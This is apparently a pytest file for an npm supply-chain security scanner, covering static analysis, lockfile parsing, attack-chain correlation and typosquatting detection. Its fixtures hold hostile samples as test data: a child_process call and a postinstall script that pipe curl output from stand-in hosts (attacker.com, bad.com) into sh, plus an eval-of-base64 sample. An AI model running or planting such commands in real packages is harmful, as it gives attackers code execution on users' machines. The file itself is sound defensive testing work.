import tempfile
import os
import json
from backend.app.services.static_analyzer import StaticSourceAnalyzer
from backend.app.services.dependency_analyzer import DependencyAnalyzer
from backend.app.services.behaviour_analyzer import BehaviourCorrelationEngine
from backend.app.services.npm_registry import NPMRegistryService, _levenshtein_distance


def test_static_analyzer_detects_eval_base64():
    analyzer = StaticSourceAnalyzer()
    
    with tempfile.TemporaryDirectory() as tmpdir:
        js_file = os.path.join(tmpdir, "malicious.js")
        with open(js_file, "w") as f:
            f.write("// Payload test\nconst str = 'Y29uc29sZS5sb2coMSk7';\neval(atob(str));\n")

        findings = analyzer.analyze_directory(tmpdir)
        assert len(findings) > 0
        rule_ids = [f["rule_id"] for f in findings]
        assert any("eval" in r or "base64" in r for r in rule_ids)


def test_static_analyzer_detects_process_spawn():
    analyzer = StaticSourceAnalyzer()
    with tempfile.TemporaryDirectory() as tmpdir:
        js_file = os.path.join(tmpdir, "exec_payload.js")
        with open(js_file, "w") as f:
            f.write("const cp = require('child_process');\ncp.exec('curl http://attacker.com/sh | sh');\n")

        findings = analyzer.analyze_directory(tmpdir)
        assert len(findings) > 0
        severities = [f["severity"] for f in findings]
        assert "critical" in severities or "high" in severities


def test_dependency_analyzer_manifest():
    analyzer = DependencyAnalyzer()
    manifest_json = """
    {
        "name": "my-project",
        "version": "2.0.0",
        "dependencies": {
            "express": "^4.18.2"
        },
        "devDependencies": {
            "jest": "^29.0.0"
        }
    }
    """
    deps, summary = analyzer.parse_manifest(manifest_json, "package.json")
    assert summary["project_name"] == "my-project"
    assert len(deps) == 2
    names = [d["name"] for d in deps]
    assert "express" in names
    assert "jest" in names


def test_dependency_analyzer_lockfile_v2():
    analyzer = DependencyAnalyzer()
    lockfile_json = """
    {
        "name": "my-secure-project",
        "version": "1.0.0",
        "lockfileVersion": 2,
        "packages": {
            "": {
                "name": "my-secure-project",
                "version": "1.0.0",
                "dependencies": {
                    "lodash": "^4.17.21"
                }
            },
            "node_modules/lodash": {
                "version": "4.17.21",
                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
            },
            "node_modules/axios": {
                "version": "1.6.0",
                "resolved": "https://registry.npmjs.org/axios/-/axios-1.6.0.tgz"
            }
        }
    }
    """
    deps, summary = analyzer.parse_manifest(lockfile_json, "package-lock.json")
    assert summary["lockfile_version"] == 2
    assert len(deps) >= 2
    names = [d["name"] for d in deps]
    assert "lodash" in names
    assert "axios" in names


def test_behaviour_correlation_defense_evasion():
    engine = BehaviourCorrelationEngine()
    static_findings = [
        {"rule_id": "threat-runtime-obfuscation-base64exec", "title": "Base64 Dynamic Exec"},
        {"rule_id": "process-spawn-shell", "title": "Child Process Spawn"}
    ]
    metadata = {"has_install_scripts": True}
    
    correlated = engine.correlate_findings(static_findings, metadata)
    assert len(correlated) > 0
    rule_ids = [c["rule_id"] for c in correlated]
    assert "attack-chain-defense-evasion" in rule_ids


def test_behaviour_correlation_exfiltration():
    engine = BehaviourCorrelationEngine()
    static_findings = [
        {"rule_id": "sensitive-file-access-ssh", "title": "Access to ~/.ssh"},
        {"rule_id": "network-discord-webhook", "title": "Discord Webhook Exfiltration"}
    ]
    metadata = {}
    
    correlated = engine.correlate_findings(static_findings, metadata)
    assert len(correlated) > 0
    rule_ids = [c["rule_id"] for c in correlated]
    assert "attack-chain-exfiltration" in rule_ids


def test_typosquatting_detection():
    # Levenshtein distance check
    assert _levenshtein_distance("lodsh", "lodash") == 1
    assert _levenshtein_distance("reactt", "react") == 1
    
    registry = NPMRegistryService()
    meta = registry.analyze_metadata(
        package_name="lodsh",
        version="1.0.0",
        full_data={},
        version_data={
            "scripts": {"postinstall": "curl http://bad.com | sh"},
            "author": {"name": "Hacker", "email": "anon@mailinator.com"}
        }
    )
    assert meta["is_typosquatting"] is True
    assert meta["typosquatting_target"] == "lodash"
    assert meta["has_install_scripts"] is True
    assert meta["is_unclaimed_or_disposable"] is True
